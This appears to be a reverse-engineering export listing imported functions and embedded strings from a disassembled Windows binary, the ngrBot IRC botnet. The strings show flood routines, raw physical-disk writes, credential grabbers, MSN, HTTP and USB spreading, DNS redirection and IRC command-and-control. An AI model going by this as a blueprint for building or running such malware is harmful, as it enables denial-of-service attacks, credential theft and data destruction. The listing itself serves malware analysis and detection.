reference_vaddr	symbol_addr	symbol_type	caller_function	data
0xed964a	0xee29d8	string	0xed9580	POST
0xed967f	0xee2968	string	0xed9580	%s / ?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nKeep-Alive: 300\r\nConnection: keep-alive\r\nContent-Length: 42\r\n
0xed970b	0xee1180	import	0xed96b0	KERNEL32.dll.HeapFree
0xed9728	0xee10a0	import	0xed96b0	KERNEL32.dll.lstrcpynA
0xed9751	0xee1180	import	0xed96b0	KERNEL32.dll.HeapFree
0xed9770	0xee1174	import	0xed96b0	KERNEL32.dll.GetTickCount
0xed97ba	0xee6024	string	0xed96b0	[SYN]: Starting flood on "%s:%d" for %d second(s)
0xed97f0	0xee6058	string	0xed96b0	[SYN]: Finished flood on "%s:%d"
0xed981c	0xee1180	import	0xed96b0	KERNEL32.dll.HeapFree
0xed988b	0xee1180	import	0xed9830	KERNEL32.dll.HeapFree
0xed98a8	0xee10a0	import	0xed9830	KERNEL32.dll.lstrcpynA
0xed98d1	0xee1180	import	0xed9830	KERNEL32.dll.HeapFree
0xed98f0	0xee1174	import	0xed9830	KERNEL32.dll.GetTickCount
0xed993a	0xee5fcc	string	0xed9830	[UDP]: Starting flood on "%s:%d" for %d second(s)
0xed9970	0xee6000	string	0xed9830	[UDP]: Finished flood on "%s:%d"
0xed999c	0xee1180	import	0xed9830	KERNEL32.dll.HeapFree
0xed9a2d	0xee1174	import	0xed99b0	KERNEL32.dll.GetTickCount
0xed9a60	0xee1174	import	0xed99b0	KERNEL32.dll.GetTickCount
0xed9abe	0xee1188	import	0xed99b0	KERNEL32.dll.Sleep
0xed9ae7	0xee1120	import	0xed99b0	KERNEL32.dll.lstrcpyA
0xed9af0	0xee2a08	string	0xed99b0	X-a: b\r\n
0xed9b00	0xee29f0	string	0xed99b0	Connection: Close\r\n\r\n
0xed9b0f	0xee1184	import	0xed99b0	KERNEL32.dll.lstrlenA
0xed9b51	0xee1188	import	0xed99b0	KERNEL32.dll.Sleep
0xed9b5e	0xee1184	import	0xed99b0	KERNEL32.dll.lstrlenA
0xed9b66	0xee1174	import	0xed99b0	KERNEL32.dll.GetTickCount
0xed9b7f	0xee1188	import	0xed99b0	KERNEL32.dll.Sleep
0xed9bd2	0xee1174	import	0xed99b0	KERNEL32.dll.GetTickCount
0xed9be4	0xee1184	import	0xed99b0	KERNEL32.dll.lstrlenA
0xed9c43	0xee1174	import	0xed99b0	KERNEL32.dll.GetTickCount
0xed9c9a	0xee1180	import	0xed9c60	KERNEL32.dll.HeapFree
0xed9cb3	0xee1120	import	0xed9c60	KERNEL32.dll.lstrcpyA
0xed9cc4	0xee10a0	import	0xed9c60	KERNEL32.dll.lstrcpynA
0xed9cf9	0xee5f70	string	0xed9c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0xed9d45	0xee5fa8	string	0xed9c60	[Slowloris]: Finished flood on "%s"
0xed9d73	0xee1180	import	0xed9c60	KERNEL32.dll.HeapFree
0xed9da7	0xee1094	import	0xed9d90	KERNEL32.dll.VirtualAlloc
0xed9dd0	0xee2a14	string	0xed9d90	\\.\PHYSICALDRIVE0
0xed9dd5	0xee1110	import	0xed9d90	KERNEL32.dll.CreateFileA
0xed9e02	0xee1098	import	0xed9d90	KERNEL32.dll.DeviceIoControl
0xed9e21	0xee109c	import	0xed9d90	KERNEL32.dll.SetFilePointer
0xed9e2a	0xee1164	import	0xed9d90	KERNEL32.dll.WriteFile
0xed9e56	0xee109c	import	0xed9d90	KERNEL32.dll.SetFilePointer
0xed9ea2	0xee1098	import	0xed9d90	KERNEL32.dll.DeviceIoControl
0xed9eec	0xee2a28	string	0xed9ec0	00100
0xed9f09	0xee2a14	string	0xed9ec0	\\.\PHYSICALDRIVE0
0xed9f16	0xee1110	import	0xed9ec0	KERNEL32.dll.CreateFileA
0xed9f2b	0xee1098	import	0xed9ec0	KERNEL32.dll.DeviceIoControl
0xed9f5a	0xee1164	import	0xed9ec0	KERNEL32.dll.WriteFile
0xed9f77	0xee1150	import	0xed9ec0	KERNEL32.dll.CloseHandle
0xeda0a2	0xee1158	import	0xeda080	KERNEL32.dll.CreateFileW
0xeda0c0	0xee1164	import	0xeda080	KERNEL32.dll.WriteFile
0xeda0cb	0xee1150	import	0xeda080	KERNEL32.dll.CloseHandle
0xeda0d8	0xee1150	import	0xeda080	KERNEL32.dll.CloseHandle
0xeda184	0xee10c8	import	0xeda150	KERNEL32.dll.GetWindowsDirectoryW
0xeda2ab	0xee1090	import	0xeda260	KERNEL32.dll.CreateProcessW
0xeda2c5	0xee1174	import	0xeda2c0	KERNEL32.dll.GetTickCount
0xeda39f	0xee1184	import	0xeda310	KERNEL32.dll.lstrlenA
0xeda3a8	0xee585c	string	0xeda310	2d9fa278
0xeda3b0	0xee585c	string	0xeda310	2d9fa278
0xeda3bb	0xee6a44	string	0xeda310	\\.\pipe\%08x_ipc
0xeda3fd	0xee585c	string	0xeda310	2d9fa278
0xeda40e	0xee585c	string	0xeda310	2d9fa278
0xeda436	0xee119c	import	0xeda310	KERNEL32.dll.EnterCriticalSection
0xeda452	0xee1110	import	0xeda310	KERNEL32.dll.CreateFileA
0xeda464	0xee1198	import	0xeda310	KERNEL32.dll.LeaveCriticalSection
0xeda484	0xee1164	import	0xeda310	KERNEL32.dll.WriteFile
0xeda48b	0xee1150	import	0xeda310	KERNEL32.dll.CloseHandle
0xeda496	0xee1188	import	0xeda310	KERNEL32.dll.Sleep
0xeda4a1	0xee1198	import	0xeda310	KERNEL32.dll.LeaveCriticalSection
0xeda557	0xee2a48	string	0xeda550	NtShutdownSystem
0xeda55c	0xee16e8	string	0xeda550	ntdll.dll
0xeda57a	0xee1024	import	0xeda550	ADVAPI32.dll.OpenProcessToken
0xeda588	0xee2a34	string	0xeda550	SeShutdownPrivilege
0xeda58f	0xee1028	import	0xeda550	ADVAPI32.dll.LookupPrivilegeValueA
0xeda5b3	0xee102c	import	0xeda550	ADVAPI32.dll.AdjustTokenPrivileges
0xeda5b9	0xee116c	import	0xeda550	KERNEL32.dll.GetLastError
0xeda659	0xee10cc	import	0xeda5d0	KERNEL32.dll.CreateThread
0xeda661	0xee2ad4	string	0xeda5d0	ngrBot Error
0xeda666	0xee2a60	string	0xeda5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0xeda66f	0xee12a4	import	0xeda5d0	USER32.dll.MessageBoxA
0xeda678	0xee10f8	import	0xeda5d0	KERNEL32.dll.WaitForSingleObject
0xeda680	0xee108c	import	0xeda5d0	KERNEL32.dll.ExitProcess
0xeda6df	0xee1238	import	0xeda690	SHELL32.dll.SHGetSpecialFolderPathW
0xeda6ed	0xee1728	string	0xeda690	Internet Explorer\iexplore.exe
0xeda6f9	0xee1240	import	0xeda690	SHLWAPI.dll.PathAppendW
0xeda70a	0xee2af0	string	0xeda690	"%s" %S
0xeda77f	0xee1090	import	0xeda690	KERNEL32.dll.CreateProcessW
0xeda7aa	0xee1174	import	0xeda790	KERNEL32.dll.GetTickCount
0xeda7dc	0xee1188	import	0xeda790	KERNEL32.dll.Sleep
0xeda819	0xee1174	import	0xeda800	KERNEL32.dll.GetTickCount
0xeda859	0xee1188	import	0xeda800	KERNEL32.dll.Sleep
0xeda8b1	0xee1534	string	0xeda880	msnu
0xeda8bd	0xee1330	string	0xeda880	pdef
0xeda8c9	0xee1b04	string	0xeda880	ffgrab
0xeda8d5	0xee1b0c	string	0xeda880	iegrab
0xeda8e1	0xee1a9c	string	0xeda880	ftpgrab
0xeda8ed	0xee1a68	string	0xeda880	popgrab
0xeda8fc	0xee13e4	string	0xeda880	bdns
0xeda908	0xee2b1c	string	0xeda880	usbi
0xeda914	0xee2b14	string	0xeda880	httpi
0xeda946	0xee2b04	string	0xeda880	http
0xeda956	0xee2b04	string	0xeda880	http
0xeda970	0xee2b30	string	0xeda970	DnsFlushResolverCache
0xeda975	0xee2b24	string	0xeda970	dnsapi.dll
0xeda9ed	0xee1090	import	0xeda990	KERNEL32.dll.CreateProcessW
0xedaa39	0xee29e0	string	0xedaa10	Mozilla/4.0
0xedaa45	0xee1120	import	0xedaa10	KERNEL32.dll.lstrcpyA
0xedaa60	0xee12b8	import	0xedaa10	WININET.dll.InternetOpenA
0xedaa78	0xee1184	import	0xedaa10	KERNEL32.dll.lstrlenA
0xedaa8c	0xee12b4	import	0xedaa10	WININET.dll.InternetOpenUrlA
0xedaac0	0xee12b0	import	0xedaa10	WININET.dll.HttpQueryInfoA
0xedaae2	0xee12ac	import	0xedaa10	WININET.dll.InternetQueryDataAvailable
0xedab00	0xee12c8	import	0xedaa10	WININET.dll.InternetReadFile
0xedabe7	0xee12c4	import	0xedaa10	WININET.dll.InternetCloseHandle
0xedac1a	0xee1178	import	0xedac00	KERNEL32.dll.HeapAlloc
0xedac29	0xee12bc	import	0xedac00	WININET.dll.HttpQueryInfoW
0xedac44	0xee116c	import	0xedac00	KERNEL32.dll.GetLastError
0xedac5e	0xee11a0	import	0xedac00	KERNEL32.dll.HeapReAlloc
0xedac80	0xee2b48	string	0xedac00	POST
0xedac85	0xee1134	import	0xedac00	KERNEL32.dll.lstrcmpW
0xedac99	0xee1180	import	0xedac00	KERNEL32.dll.HeapFree
0xedacb2	0xee1180	import	0xedac00	KERNEL32.dll.HeapFree
0xedad0a	0xee1178	import	0xedacd0	KERNEL32.dll.HeapAlloc
0xedad1a	0xee12c0	import	0xedacd0	WININET.dll.InternetQueryOptionW
0xedad31	0xee116c	import	0xedacd0	KERNEL32.dll.GetLastError
0xedad4f	0xee11a0	import	0xedacd0	KERNEL32.dll.HeapReAlloc
0xedad80	0xee112c	import	0xedacd0	KERNEL32.dll.WideCharToMultiByte
0xedadb3	0xee1120	import	0xedacd0	KERNEL32.dll.lstrcpyA
0xedade6	0xee1180	import	0xedacd0	KERNEL32.dll.HeapFree
0xedae05	0xee1184	import	0xedae00	KERNEL32.dll.lstrlenA
0xedae13	0xee1178	import	0xedae00	KERNEL32.dll.HeapAlloc
0xedae69	0xee1120	import	0xedae00	KERNEL32.dll.lstrcpyA
0xedae7f	0xee1088	import	0xedae00	KERNEL32.dll.lstrcatA
0xedaed5	0xee1180	import	0xedae00	KERNEL32.dll.HeapFree
0xedaeeb	0xee1180	import	0xedae00	KERNEL32.dll.HeapFree
0xedaf58	0xee1120	import	0xedae00	KERNEL32.dll.lstrcpyA
0xedaf70	0xee1180	import	0xedae00	KERNEL32.dll.HeapFree
0xedafaf	0xee1184	import	0xedafa0	KERNEL32.dll.lstrlenA
0xedafcb	0xee1178	import	0xedafa0	KERNEL32.dll.HeapAlloc
0xedb024	0xee2b88	string	0xedafa0	POST /%1023s
0xedb055	0xee2b7c	string	0xedafa0	Host:
0xedb08e	0xee10a0	import	0xedafa0	KERNEL32.dll.lstrcpynA
0xedb0d5	0xee1178	import	0xedafa0	KERNEL32.dll.HeapAlloc
0xedb0e3	0xee2b74	string	0xedafa0	HTTP
0xedb0ff	0xee2b68	string	0xedafa0	http://%s/
0xedb11e	0xee2b58	string	0xedafa0	http://%s/%s
0xedb13c	0xee1180	import	0xedafa0	KERNEL32.dll.HeapFree
0xedb16a	0xee1184	import	0xedb160	KERNEL32.dll.lstrlenA
0xedb186	0xee1178	import	0xedb160	KERNEL32.dll.HeapAlloc
0xedb199	0xee2b98	string	0xedb160	\r\n\r\n
0xedb1d2	0xee1178	import	0xedb160	KERNEL32.dll.HeapAlloc
0xedb1e5	0xee10a0	import	0xedb160	KERNEL32.dll.lstrcpynA
0xedb1f8	0xee1180	import	0xedb160	KERNEL32.dll.HeapFree
0xedb2ee	0xedb2b0	string	0xedb290	<%u2
0xedb312	0xee117c	import	0xedb300	KERNEL32.dll.GetProcessHeap
0xedb319	0xee1178	import	0xedb300	KERNEL32.dll.HeapAlloc
0xedb366	0xee2bb4	string	0xedb300	lol.exe
0xedb387	0xee10c8	import	0xedb300	KERNEL32.dll.GetWindowsDirectoryW
0xedb3a1	0xee10b8	import	0xedb300	KERNEL32.dll.lstrcpynW
0xedb3bb	0xee1084	import	0xedb300	KERNEL32.dll.GetVolumeInformationW
0xedb3cd	0xee1184	import	0xedb300	KERNEL32.dll.lstrlenA
0xedb3d3	0xee585c	string	0xedb300	2d9fa278
0xedb3ea	0xee585c	string	0xedb300	2d9fa278
0xedb45b	0xee2ba0	string	0xedb300	.exe
0xedb461	0xee10bc	import	0xedb300	KERNEL32.dll.lstrcatW
0xedb4a9	0xee2c18	string	0xedb480	isadmin
0xedb4ae	0xee2c10	string	0xedb480	admin
0xedb4fe	0xee1120	import	0xedb480	KERNEL32.dll.lstrcpyA
0xedb536	0xee1178	import	0xedb480	KERNEL32.dll.HeapAlloc
0xedb550	0xee10d8	import	0xedb480	KERNEL32.dll.GetVersionExA
0xedb60d	0xee1178	import	0xedb480	KERNEL32.dll.HeapAlloc
0xedb620	0xee6a28	string	0xedb480	http://api.wipmania.com/
0xedb63b	0xee2be8	string	0xedb480	<br>
0xedb650	0xee1184	import	0xedb480	KERNEL32.dll.lstrlenA
0xedb65f	0xee1184	import	0xedb480	KERNEL32.dll.lstrlenA
0xedb67d	0xee1080	import	0xedb480	KERNEL32.dll.GetLocaleInfoA
0xedb6a8	0xee1128	import	0xedb480	KERNEL32.dll.lstrcmpA
0xedb6c5	0xee1080	import	0xedb480	KERNEL32.dll.GetLocaleInfoA
0xedb6f9	0xee1080	import	0xedb480	KERNEL32.dll.GetLocaleInfoA
0xedb741	0xee1178	import	0xedb480	KERNEL32.dll.HeapAlloc
0xedb7f1	0xee2bd0	string	0xedb480	n%s{%s|%s%s}%s
0xedb80b	0xee2bc4	string	0xedb480	{%s|%s%s}%s
0xedb8be	0xee2bd0	string	0xedb480	n%s{%s|%s%s}%s
0xedb8d5	0xee2bc4	string	0xedb480	{%s|%s%s}%s
0xedb94b	0xee2c20	string	0xedb900	127.0.0.1
0xedb975	0xee1188	import	0xedb900	KERNEL32.dll.Sleep
0xedb9bc	0xee119c	import	0xedb990	KERNEL32.dll.EnterCriticalSection
0xedb9d1	0xee12a0	import	0xedb990	USER32.dll.wvsprintfA
0xedb9f2	0xee1198	import	0xedb990	KERNEL32.dll.LeaveCriticalSection
0xedba42	0xee12a0	import	0xedba00	USER32.dll.wvsprintfA
0xedba56	0xee5e8c	string	0xedba00	PRIVMSG %s :%s\r\n
0xedba7f	0xee5d94	string	0xedba70	PASS %s\r\n
0xedba9c	0xee5e64	string	0xedba70	NICK %s\r\n
0xedbab4	0xee5e50	string	0xedba70	USER %s 0 0 :%s\r\n
0xedbb52	0xee1184	import	0xedbb30	KERNEL32.dll.lstrlenA
0xedbba0	0xee1128	import	0xedbb80	KERNEL32.dll.lstrcmpA
0xedbbff	0xee1128	import	0xedbbb0	KERNEL32.dll.lstrcmpA
0xedbc2c	0xee585c	string	0xedbbb0	2d9fa278
0xedbc31	0xee5854	string	0xedbbb0	1.1.0.0
0xedbc36	0xee5ec8	string	0xedbbb0	[v="%s" c="%s" h="%s" p="%S"]
0xedbc89	0xee2cf4	string	0xedbbb0	reconnecting
0xedbc8e	0xee5ea0	string	0xedbbb0	QUIT :%s\r\n
0xedbcc3	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedbce1	0xee1180	import	0xedbbb0	KERNEL32.dll.HeapFree
0xedbcec	0xee2cf4	string	0xedbbb0	reconnecting
0xedbcf1	0xee5ea0	string	0xedbbb0	QUIT :%s\r\n
0xedbd28	0xee2ce8	string	0xedbbb0	exiting
0xedbd2d	0xee5ea0	string	0xedbbb0	QUIT :%s\r\n
0xedbd4a	0xee58a0	string	0xedbbb0	KOSOMAKYAD
0xedbd5a	0xee2cdc	string	0xedbbb0	removing
0xedbd5f	0xee5ea0	string	0xedbbb0	QUIT :%s\r\n
0xedbdb2	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedbdc6	0xee1088	import	0xedbbb0	KERNEL32.dll.lstrcatA
0xedbdd5	0xee5e70	string	0xedbbb0	JOIN %s %s\r\n
0xedbe0c	0xee2ccc	string	0xedbbb0	#new
0xedbe18	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedbe2a	0xee5e70	string	0xedbbb0	JOIN %s %s\r\n
0xedbe72	0xee2cbc	string	0xedbbb0	#admin
0xedbe79	0xee2cb4	string	0xedbbb0	#user
0xedbe7f	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedbe91	0xee5e70	string	0xedbbb0	JOIN %s %s\r\n
0xedbecb	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedbed1	0xee5854	string	0xedbbb0	1.1.0.0
0xedbee7	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedbefa	0xee1088	import	0xedbbb0	KERNEL32.dll.lstrcatA
0xedbf0c	0xee5e70	string	0xedbbb0	JOIN %s %s\r\n
0xedbf5f	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedbf73	0xee1088	import	0xedbbb0	KERNEL32.dll.lstrcatA
0xedbf82	0xee5e80	string	0xedbbb0	PART %s\r\n
0xedbfa6	0xee2ccc	string	0xedbbb0	#new
0xedbfb2	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedbfc4	0xee5e80	string	0xedbbb0	PART %s\r\n
0xedc00c	0xee2cbc	string	0xedbbb0	#admin
0xedc013	0xee2cb4	string	0xedbbb0	#user
0xedc019	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc02b	0xee5e80	string	0xedbbb0	PART %s\r\n
0xedc065	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc06b	0xee5854	string	0xedbbb0	1.1.0.0
0xedc081	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc094	0xee1088	import	0xedbbb0	KERNEL32.dll.lstrcatA
0xedc0a6	0xee5e80	string	0xedbbb0	PART %s\r\n
0xedc0c3	0xee5940	string	0xedbbb0	stop
0xedc0e3	0xee590c	string	0xedbbb0	stats
0xedc124	0xee6194	string	0xedbbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0xedc156	0xee61c0	string	0xedbbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0xedc192	0xee6194	string	0xedbbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0xedc1b9	0xee61c0	string	0xedbbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0xedc1d2	0xee591c	string	0xedbbb0	logins
0xedc225	0xee1180	import	0xedbbb0	KERNEL32.dll.HeapFree
0xedc25e	0xee2c88	string	0xedbbb0	[Logins]: Cleared %d logins
0xedc283	0xee2c80	string	0xedbbb0	%s|%s
0xedc2c2	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedc2d2	0xee1178	import	0xedbbb0	KERNEL32.dll.HeapAlloc
0xedc2ea	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc321	0xee6210	string	0xedbbb0	[RSOCK4]: Stopped rsock4
0xedc33f	0xee5914	string	0xedbbb0	speed
0xedc354	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc3fd	0xee58bc	string	0xedbbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0xedc449	0xee5e70	string	0xedbbb0	JOIN %s %s\r\n
0xedc477	0xee5854	string	0xedbbb0	1.1.0.0
0xedc4bf	0xee5e70	string	0xedbbb0	JOIN %s %s\r\n
0xedc532	0xee5854	string	0xedbbb0	1.1.0.0
0xedc550	0xee5e80	string	0xedbbb0	PART %s\r\n
0xedc572	0xee5e80	string	0xedbbb0	PART %s\r\n
0xedc58f	0xee588c	string	0xedbbb0	NAZEL
0xedc5d0	0xee1330	string	0xedbbb0	pdef
0xedc5e2	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedc5f7	0xee1178	import	0xedbbb0	KERNEL32.dll.HeapAlloc
0xedc60e	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc61f	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedc633	0xee1088	import	0xedbbb0	KERNEL32.dll.lstrcatA
0xedc642	0xee1088	import	0xedbbb0	KERNEL32.dll.lstrcatA
0xedc679	0xee1330	string	0xedbbb0	pdef
0xedc68f	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc6d0	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc6e0	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedc706	0xee1088	import	0xedbbb0	KERNEL32.dll.lstrcatA
0xedc73d	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc743	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedc77e	0xee14f8	string	0xedbbb0	msnmsg
0xedc7ce	0xee6090	string	0xedbbb0	[MSN]: Updated MSN spread message to "%s"
0xedc7e7	0xee58d4	string	0xedbbb0	msn.int
0xedc826	0xee1500	string	0xedbbb0	msnint
0xedc859	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedc876	0xee60bc	string	0xedbbb0	[MSN]: Updated MSN spread interval to "%s"
0xedc88f	0xee58dc	string	0xedbbb0	http.set
0xedc8b5	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc8d0	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedc8f5	0xee1088	import	0xedbbb0	KERNEL32.dll.lstrcatA
0xedc92c	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedc955	0xee2b04	string	0xedbbb0	http
0xedc972	0xee60e8	string	0xedbbb0	[HTTP]: Updated HTTP spread message to "%s"
0xedc97f	0xee58e8	string	0xedbbb0	http.int
0xedc9c0	0xee2b04	string	0xedbbb0	http
0xedc9df	0xee6138	string	0xedbbb0	[HTTP]: Updated HTTP spread interval to "%s"
0xedc9f8	0xee58f4	string	0xedbbb0	http.inj
0xedca16	0xee2b14	string	0xedbbb0	httpi
0xedca26	0xee2c70	string	0xedbbb0	enabled
0xedca2b	0xee6114	string	0xedbbb0	[HTTP]: Injected value is now %s.
0xedca43	0xee2b14	string	0xedbbb0	httpi
0xedca53	0xee2c64	string	0xedbbb0	disabled
0xedca58	0xee6114	string	0xedbbb0	[HTTP]: Injected value is now %s.
0xedca71	0xee5904	string	0xedbbb0	mdns
0xedca9f	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedcadd	0xee1178	import	0xedbbb0	KERNEL32.dll.HeapAlloc
0xedcaf3	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedcb36	0xee13e4	string	0xedbbb0	bdns
0xedcb56	0xee2c44	string	0xedbbb0	[DNS]: Redirecting "%s" to "%s"
0xedcb76	0xee13e4	string	0xedbbb0	bdns
0xedcb7b	0xee13dc	string	0xedbbb0	block
0xedcb95	0xee6180	string	0xedbbb0	[DNS]: Blocked "%s"
0xedcbf4	0xee6168	string	0xedbbb0	[Visit]: Visited "%s"
0xedcc0a	0xee63bc	string	0xedbbb0	[Visit]: Error visitng "%s"
0xedcc23	0xee5894	string	0xedbbb0	NAZELup
0xedcc3a	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedcc8b	0xee2c34	string	0xedbbb0	%s|%s|%s
0xedcca8	0xee2c80	string	0xedbbb0	%s|%s
0xedccd4	0xee1178	import	0xedbbb0	KERNEL32.dll.HeapAlloc
0xedcce4	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedcd11	0xee592c	string	0xedbbb0	slow
0xedcd27	0xee2c80	string	0xedbbb0	%s|%s
0xedcd47	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedcd58	0xee1178	import	0xedbbb0	KERNEL32.dll.HeapAlloc
0xedcd70	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedcdfc	0xee1534	string	0xedbbb0	msnu
0xedce55	0xee1330	string	0xedbbb0	pdef
0xedce66	0xee1b04	string	0xedbbb0	ffgrab
0xedce7b	0xee1b0c	string	0xedbbb0	iegrab
0xedce8c	0xee1a9c	string	0xedbbb0	ftpgrab
0xedce9d	0xee1a68	string	0xedbbb0	popgrab
0xedceb2	0xee13e4	string	0xedbbb0	bdns
0xedcec7	0xee2b1c	string	0xedbbb0	usbi
0xedcf67	0xee61ec	string	0xedbbb0	[RSOCK4]: Started rsock4 on "%s:%d"
0xedcfe3	0xee2c34	string	0xedbbb0	%s|%s|%s
0xedd003	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedd013	0xee1178	import	0xedbbb0	KERNEL32.dll.HeapAlloc
0xedd02b	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedd043	0xee5934	string	0xedbbb0	ssyn
0xedd097	0xee2c34	string	0xedbbb0	%s|%s|%s
0xedd0b7	0xee1184	import	0xedbbb0	KERNEL32.dll.lstrlenA
0xedd0c8	0xee1178	import	0xedbbb0	KERNEL32.dll.HeapAlloc
0xedd0dc	0xee1120	import	0xedbbb0	KERNEL32.dll.lstrcpyA
0xedd0f0	0xee10cc	import	0xedbbb0	KERNEL32.dll.CreateThread
0xedd0f7	0xee1150	import	0xedbbb0	KERNEL32.dll.CloseHandle
0xedd145	0xee1128	import	0xedd110	KERNEL32.dll.lstrcmpA
0xedd18c	0xee10a0	import	0xedd110	KERNEL32.dll.lstrcpynA
0xedd198	0xee1184	import	0xedd110	KERNEL32.dll.lstrlenA
0xedd231	0xee1184	import	0xedd220	KERNEL32.dll.lstrlenA
0xedd243	0xee2d18	string	0xedd220	MOTD
0xedd2b5	0xee1128	import	0xedd220	KERNEL32.dll.lstrcmpA
0xedd2bb	0xee5eb8	string	0xedd220	PING
0xedd2d1	0xee5eac	string	0xedd220	PONG %s\r\n
0xedd308	0xee5e70	string	0xedd220	JOIN %s %s\r\n
0xedd33c	0xee5e64	string	0xedd220	NICK %s\r\n
0xedd351	0xee18c4	string	0xedd220	JOIN
0xedd37f	0xee5ec0	string	0xedd220	PRIVMSG
0xedd43c	0xee5e70	string	0xedd220	JOIN %s %s\r\n
0xedd5cd	0xee18d0	string	0xedd530	%s:%d
0xedd5e4	0xee1188	import	0xedd530	KERNEL32.dll.Sleep
0xedd659	0xee1188	import	0xedd530	KERNEL32.dll.Sleep
0xedd6fd	0xee1018	import	0xedd6b0	ADVAPI32.dll.RegCreateKeyExW
0xedd731	0xee1000	import	0xedd6b0	ADVAPI32.dll.RegSetValueExW
0xedd740	0xee1020	import	0xedd6b0	ADVAPI32.dll.RegCloseKey
0xedd753	0xee1020	import	0xedd6b0	ADVAPI32.dll.RegCloseKey
0xedd7b2	0xee1178	import	0xedd7a0	KERNEL32.dll.HeapAlloc
0xedd80b	0xee1180	import	0xedd7a0	KERNEL32.dll.HeapFree
0xedd819	0xee1180	import	0xedd7a0	KERNEL32.dll.HeapFree
0xedd82f	0xee116c	import	0xedd7a0	KERNEL32.dll.GetLastError
0xedd83c	0xee1180	import	0xedd7a0	KERNEL32.dll.HeapFree
0xedd852	0xee116c	import	0xedd7a0	KERNEL32.dll.GetLastError
0xedd85b	0xee1180	import	0xedd7a0	KERNEL32.dll.HeapFree
0xedd87a	0xee1170	import	0xedd7a0	KERNEL32.dll.ReadFile
0xedd8fa	0xee585c	string	0xedd7a0	2d9fa278
0xedd900	0xee1184	import	0xedd7a0	KERNEL32.dll.lstrlenA
0xedd908	0xee585c	string	0xedd7a0	2d9fa278
0xedd916	0xee1178	import	0xedd7a0	KERNEL32.dll.HeapAlloc
0xedd952	0xee1184	import	0xedd7a0	KERNEL32.dll.lstrlenA
